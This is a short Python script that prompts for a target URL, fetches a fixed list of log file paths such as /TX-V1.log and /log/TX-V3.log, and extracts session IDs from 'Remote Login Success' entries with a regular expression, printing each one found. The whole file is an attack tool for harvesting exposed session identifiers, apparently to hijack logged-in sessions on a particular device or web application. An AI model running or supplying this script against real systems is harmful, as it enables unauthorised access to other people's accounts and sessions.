import requests
import re

# List of directories to check
dirs = [
    "/TX-V1.log",
    "/TX-V2.log",
    "/TX-V3.log",
    "/log/TX-V1.log",
    "/log/TX-V2.log",
    "/log/TX-V3.log",
]

base_url = str(input("Enter the target url : "))  # Replace with the actual base URL

# Regular expression to extract all SIDs
sid_pattern = re.compile(r"Remote Login Success.*?sid:\s*(\d+)")

# Set to track unique SIDs
unique_sids = set()

for dir_path in dirs:
    url = base_url + dir_path
    response = requests.get(url)
    
    if response.status_code == 200:
        # Find all SIDs in the response
        matches = sid_pattern.findall(response.text)
        
        for sid in matches:
            if sid not in unique_sids:
                unique_sids.add(sid)
                print(f"SID found : {sid}")
        break
    else:
        print(f"returned status code: {response.status_code}")
